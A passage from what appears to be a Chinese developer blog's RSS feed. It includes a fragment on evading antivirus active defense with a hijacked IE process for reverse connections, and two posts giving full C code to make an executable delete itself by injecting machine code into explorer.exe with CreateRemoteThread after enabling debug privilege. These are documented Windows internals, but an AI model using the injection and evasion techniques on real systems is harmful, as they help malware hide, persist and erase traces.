Pro，该系统下，如果一个其它的进程启动IE并且访问网络，安全报警仍然会以该进程本身访问网络为准执行，另外还会弹框警告，除非将自己的僵尸IE进程的父进程更改，或者不用IE来反弹连接。&lt;br&gt;国产的瑞星，总体来说这个系统的主动防御弱于国外产品，但是它特殊在于，会对IE作出非常严格的限制，默认不允许IE装载任何非系统的dll。因此在这个系统下基本不可能利用IE反弹。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;其他的特殊情况还有很多。作为一个成熟产品开发者，这些都是必须要考虑的。&lt;br&gt;感谢：VXK（郭宏硕）， xyzreg（张翼）。 &lt;p&gt;&amp;nbsp;&lt;/p&gt;</description></item><item><title>用远线程实现文件自删除(代码)</title><link>https://blogs.qipai360.cn/post/file-self-deletion-using-remote-threading-code/</link><pubDate>Thu, 29 Nov 2007 16:55:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/file-self-deletion-using-remote-threading-code/</guid><description>&lt;p&gt;#include &amp;lt;windows.h&amp;gt;&lt;br&gt;#include &amp;lt;tchar.h&amp;gt;&lt;br&gt;#include &amp;lt;TLHELP32.H&amp;gt;&lt;br&gt;#include &amp;lt;stddef.h&amp;gt; &lt;p&gt;/*&lt;br&gt;push dwTime&lt;br&gt;call Sleep &lt;p&gt;mov&amp;nbsp; eax, [esp + 4]&lt;br&gt;push eax&lt;br&gt;call DeleteFileA&lt;br&gt;ret&amp;nbsp; 4&lt;br&gt;*/ &lt;p&gt;#pragma pack(push, 1)&lt;br&gt;typedef struct _tagDeleteStruct {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; BYTE&amp;nbsp; byPush;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwTime;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; BYTE&amp;nbsp; wCall1;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwSleep;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwMov;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; BYTE&amp;nbsp; byPushEax;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; BYTE&amp;nbsp; wCall2;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwDeleteFileA;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; BYTE&amp;nbsp; byRet;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; WORD&amp;nbsp; w4;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CHAR&amp;nbsp; szFile[1];&lt;br&gt;} DELETESTRUCT, *PDELETESTRUCT;&lt;br&gt;#pragma pack(pop) &lt;p&gt;void EnablePrivilege(void)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; HANDLE&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; hToken;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; TOKEN_PRIVILEGES tp = { 0 }; &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; HANDLE hProcess = GetCurrentProcess(); &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;amp;hToken))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return; &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;amp;tp.Privileges[0].Luid))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle(hToken);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; } &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; tp.PrivilegeCount = 1;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; AdjustTokenPrivileges(hToken, FALSE, &amp;amp;tp, sizeof(TOKEN_PRIVILEGES),&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; NULL, NULL);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle(hToken);&lt;br&gt;} &lt;p&gt;DWORD FindTarget(LPCTSTR lpszProcess)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD&amp;nbsp; dwRet&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 0;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PROCESSENTRY32 pe32;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pe32.dwSize = sizeof( PROCESSENTRY32 );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Process32First(hSnapshot, &amp;amp;pe32);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; do&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (0 == lstrcmpi(pe32.szExeFile, lpszProcess))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dwRet = pe32.th32ProcessID;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; break;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; } while (Process32Next(hSnapshot, &amp;amp;pe32));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle(hSnapshot);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; return dwRet;&lt;br&gt;} &lt;p&gt;DWORD WINAPI DelProc(LPVOID lpParam)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Sleep(50);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DeleteFileA((LPCSTR)lpParam);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; return 0;&lt;br&gt;} &lt;p&gt;BOOL RemoteDel(DWORD dwProcessID, LPCSTR lpszFileName, DWORD dwTime)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 打开目标进程&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; HANDLE hProcess = OpenProcess(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dwProcessID);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (NULL == hProcess)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return FALSE; &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 向目标进程地址空间写入删除信息&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dwSize = sizeof(DELETESTRUCT) + lstrlenA(lpszFileName);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PDELETESTRUCT pDel&amp;nbsp;&amp;nbsp; = (PDELETESTRUCT)GlobalAlloc(GPTR, dwSize); &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; HMODULE hKernel32 = GetModuleHandle(_T("kernel32.dll"));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // push dwTime&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;byPush = 0x68;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;dwTime = dwTime;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // call Sleep&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;wCall1&amp;nbsp; = 0xe8;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;dwSleep = (DWORD)GetProcAddress(hKernel32, "Sleep");&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // mov&amp;nbsp; eax, [esp + 4]&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;dwMov = 0x0424448b;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // push eax&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;byPushEax = 0x50;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // call DeleteFileA&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;wCall2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 0xe8;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;dwDeleteFileA = (DWORD)GetProcAddress(hKernel32, "DeleteFileA");&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // ret&amp;nbsp; 4&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;byRet = 0xc2;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;w4&amp;nbsp;&amp;nbsp;&amp;nbsp; = 0x0004;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; lstrcpyA(pDel-&amp;gt;szFile, lpszFileName); &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; PAGE_READWRITE);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (NULL == lpBuf)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GlobalFree((HGLOBAL)pDel);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle(hProcess);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return FALSE;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; } &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 修正近调用&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;dwSleep&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; -= (DWORD)lpBuf + offsetof(DELETESTRUCT, dwMov);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pDel-&amp;gt;dwDeleteFileA -= (DWORD)lpBuf + offsetof(DELETESTRUCT, byRet);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwWritten;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; WriteProcessMemory(hProcess, lpBuf, (LPVOID)pDel, dwSize, &amp;amp;dwWritten); &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 创建线程，远程删除！&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwID;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (LPTHREAD_START_ROUTINE)lpBuf,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (LPVOID)((DWORD)lpBuf + offsetof(DELETESTRUCT, szFile)), 0, &amp;amp;dwID); &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; GlobalFree((HGLOBAL)pDel);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle(hThread);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle(hProcess);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; return TRUE;&lt;br&gt;} &lt;p&gt;int WINAPI _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPTSTR lpCmdLine, int nShowCmd)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; EnablePrivilege(); &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CHAR szMe[MAX_PATH];&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; GetModuleFileNameA(NULL, szMe, MAX_PATH); &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwId = FindTarget(_T("explorer.exe"));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; RemoteDel(dwId, szMe, 50);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; return 0;&lt;br&gt;}&lt;/p&gt;</description></item><item><title>用远线程实现文件自删除</title><link>https://blogs.qipai360.cn/post/file-self-deletion-using-remote-threading/</link><pubDate>Thu, 29 Nov 2007 16:53:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/file-self-deletion-using-remote-threading/</guid><description>&lt;p&gt;&lt;a href="http://www.titilima.cn/sample/deleteme.zip"&gt;点这里下载示例代码&lt;/a&gt; &lt;p&gt;实现文件自删除不是一个特别新的话题了，不过貌似一直没有特别完美的解决方式。从早先Gary Nebbett的堆栈溢出版本到后来的批处理、临时文件等方式，无不存在着各样瑕疵：如堆栈溢出不支持XP，临时文件（批处理）不够优雅等等。 &lt;p&gt;当然，还有用驱动发IRP的方式，不过这只是一个自删除，杀鸡焉用牛刀？于是这个方案在我这儿亦不讨论。 &lt;p&gt;李马讨论的，只是一个2005年的老调重提：远线程注入。2005年李马提到的&lt;a href="http://www.titilima.cn/readarticle.php?id=65"&gt;DLL远程注入技术&lt;/a&gt;只是远线程的最简单应用，局限很多，能做的事情很少；下面的自删除示例，则是如何让远线程能够做更多的事，也可以说是一个补充材料，不必记入原创文档了吧就。 &lt;p&gt;言归正传。首先，我们假定这个线程函数是这样的： &lt;p&gt;&lt;code&gt;DWORD&amp;nbsp;WINAPI&amp;nbsp;DelProc(LPVOID&amp;nbsp;lpParam)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Sleep(50);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DeleteFileA((LPCSTR)lpParam);&lt;br&gt;return&amp;nbsp;0;&lt;br&gt;}&lt;/code&gt; &lt;p&gt;解释一下，先用Sleep等待要删除的程序结束，之后调用DeleteFile删除目标文件。 &lt;p&gt;现在，你可以在VC的Project Settings-&amp;gt;C/C++-&amp;gt;Category: Listing Files-&amp;gt;Listing file type中，设置输出文件的类型为“Assembly, Machine Code, and Source”或“Assembly with Machine Code”，这样就会在编译完成后生成带有汇编代码和指令机器码的附属文件供你下一步对照。——当然，如果你极熟悉汇编，这一步可以跳过。 &lt;p&gt;在查看附属文件后，我们可以提取出对我们有用的汇编代码： &lt;p&gt;&lt;code&gt;push 50&lt;br&gt;call Sleep&lt;br&gt;mov&amp;nbsp; eax, [esp + 4]&lt;br&gt;push eax&lt;br&gt;call DeleteFileA&lt;br&gt;ret&amp;nbsp; 4&lt;/code&gt; &lt;p&gt;之后，对照着对应的机器码，构造下面的结构： &lt;p&gt;&lt;code&gt;#pragma pack(push,&amp;nbsp;1)&lt;br&gt;typedef struct&amp;nbsp;_tagDeleteStruct&amp;nbsp;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;BYTE&amp;nbsp;&amp;nbsp;byPush;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dwTime;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;BYTE&amp;nbsp;&amp;nbsp;wCall1;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dwSleep;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dwMov;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;BYTE&amp;nbsp;&amp;nbsp;byPushEax;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;BYTE&amp;nbsp;&amp;nbsp;wCall2;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dwDeleteFileA;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;BYTE&amp;nbsp;&amp;nbsp;byRet;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;WORD&amp;nbsp;&amp;nbsp;w4;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CHAR&amp;nbsp;&amp;nbsp;szFile[1];&lt;br&gt;}&amp;nbsp;DELETESTRUCT,&amp;nbsp;*PDELETESTRUCT;&lt;br&gt;#pragma pack(pop)&lt;/code&gt; &lt;p&gt;最后的szFile域，就是用来放置文件名的。其余的就不解释了，因为下面就要填充它了。远线程函数还是很模式化的代码，改造自两年前我的RemoteLoadLibrary： &lt;p&gt;&lt;code&gt;BOOL&amp;nbsp;RemoteDel(DWORD&amp;nbsp;dwProcessID,&amp;nbsp;LPCSTR&amp;nbsp;lpszFileName,&amp;nbsp;DWORD&amp;nbsp;dwTime)&lt;br&gt;{&lt;br&gt;//&amp;nbsp;打开目标进程&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;HANDLE&amp;nbsp;hProcess&amp;nbsp;=&amp;nbsp;OpenProcess(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PROCESS_CREATE_THREAD&amp;nbsp;|&amp;nbsp;PROCESS_VM_OPERATION&amp;nbsp;|&amp;nbsp;PROCESS_VM_WRITE,&amp;nbsp;FALSE,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;dwProcessID);&lt;br&gt;if&amp;nbsp;(NULL&amp;nbsp;==&amp;nbsp;hProcess)&lt;br&gt;return&amp;nbsp;FALSE;&lt;br&gt;//&amp;nbsp;向目标进程地址空间写入删除信息&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;dwSize&amp;nbsp;=&amp;nbsp;sizeof(DELETESTRUCT)&amp;nbsp;+&amp;nbsp;lstrlenA(lpszFileName);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PDELETESTRUCT&amp;nbsp;pDel&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;(PDELETESTRUCT)GlobalAlloc(GPTR,&amp;nbsp;dwSize);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;HMODULE&amp;nbsp;hKernel32&amp;nbsp;=&amp;nbsp;GetModuleHandle(_T("kernel32.dll"));&lt;br&gt;//&amp;nbsp;push&amp;nbsp;dwTime&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;byPush&amp;nbsp;=&amp;nbsp;0x68;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;dwTime&amp;nbsp;=&amp;nbsp;dwTime;&lt;br&gt;//&amp;nbsp;call&amp;nbsp;Sleep&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;wCall1&amp;nbsp;&amp;nbsp;=&amp;nbsp;0xe8;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;dwSleep&amp;nbsp;=&amp;nbsp;(DWORD)GetProcAddress(hKernel32,&amp;nbsp;"Sleep");&lt;br&gt;//&amp;nbsp;mov&amp;nbsp;&amp;nbsp;eax,&amp;nbsp;[esp&amp;nbsp;+&amp;nbsp;4]&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;dwMov&amp;nbsp;=&amp;nbsp;0x0424448b;&lt;br&gt;//&amp;nbsp;push&amp;nbsp;eax&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;byPushEax&amp;nbsp;=&amp;nbsp;0x50;&lt;br&gt;//&amp;nbsp;call&amp;nbsp;DeleteFileA&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;wCall2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;0xe8;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;dwDeleteFileA&amp;nbsp;=&amp;nbsp;(DWORD)GetProcAddress(hKernel32,&amp;nbsp;"DeleteFileA");&lt;br&gt;//&amp;nbsp;ret&amp;nbsp;&amp;nbsp;4&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;byRet&amp;nbsp;=&amp;nbsp;0xc2;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;w4&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;=&amp;nbsp;0x0004;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;lstrcpyA(pDel-&amp;gt;szFile,&amp;nbsp;lpszFileName);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;LPVOID&amp;nbsp;lpBuf&amp;nbsp;=&amp;nbsp;VirtualAllocEx(hProcess,&amp;nbsp;NULL,&amp;nbsp;dwSize,&amp;nbsp;MEM_COMMIT,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;PAGE_READWRITE);&lt;br&gt;if&amp;nbsp;(NULL&amp;nbsp;==&amp;nbsp;lpBuf)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;GlobalFree((HGLOBAL)pDel);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CloseHandle(hProcess);&lt;br&gt;return&amp;nbsp;FALSE;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br&gt;//&amp;nbsp;修正近调用&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;dwSleep&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;-=&amp;nbsp;(DWORD)lpBuf&amp;nbsp;+&amp;nbsp;offsetof(DELETESTRUCT,&amp;nbsp;dwMov);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;pDel-&amp;gt;dwDeleteFileA&amp;nbsp;-=&amp;nbsp;(DWORD)lpBuf&amp;nbsp;+&amp;nbsp;offsetof(DELETESTRUCT,&amp;nbsp;byRet);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dwWritten;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;WriteProcessMemory(hProcess,&amp;nbsp;lpBuf,&amp;nbsp;(LPVOID)pDel,&amp;nbsp;dwSize,&amp;nbsp;&amp;amp;dwWritten);&lt;br&gt;//&amp;nbsp;创建线程，远程删除！&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dwID;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;HANDLE&amp;nbsp;hThread&amp;nbsp;=&amp;nbsp;CreateRemoteThread(hProcess,&amp;nbsp;NULL,&amp;nbsp;0,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(LPTHREAD_START_ROUTINE)lpBuf,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(LPVOID)((DWORD)lpBuf&amp;nbsp;+&amp;nbsp;offsetof(DELETESTRUCT,&amp;nbsp;szFile)),&amp;nbsp;0,&amp;nbsp;&amp;amp;dwID);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;GlobalFree((HGLOBAL)pDel);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CloseHandle(hThread);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CloseHandle(hProcess);&lt;br&gt;return&amp;nbsp;TRUE;&lt;br&gt;}&lt;/code&gt; &lt;p&gt;至于为什么最后不用VirtualFreeEx释放资源，那是因为注入的远程代码在执行的时候目标exe就已经消失了，所以这里的寄主程序肯定存在着内存泄露，真是造孽啊。 &lt;p&gt;最后说三点。第一，RemoteDel是要挑选一个寄主程序的，这个程序应该始终运行并存在于当前的系统中，我在示例中挑选的是explorer.exe；并且，打开这个进程是需要调试权限的，提权的代码也一并加入在示例代码中，算是弥补了2005年的缺失。第二，为了方便定位，我修改了远程代码中的调用，也就是call ds:xxx（FF 15 xxx）改为了call near xxx（E8 xxx）。第三，自己手写机器码的做法的确不如纯汇编代码重定位来的优雅，但是我认为这里填充并定位Sleep和DeleteFile的片断也是纯汇编的办法无法比拟的。&lt;/p&gt;</description></item><item><title>AVP主动防御之隐藏进程</title><link>https://blogs.qipai360.cn/post/avp-active-defense-hidden-process/</link><pubDate>Thu, 29 Nov 2007 09:06:00 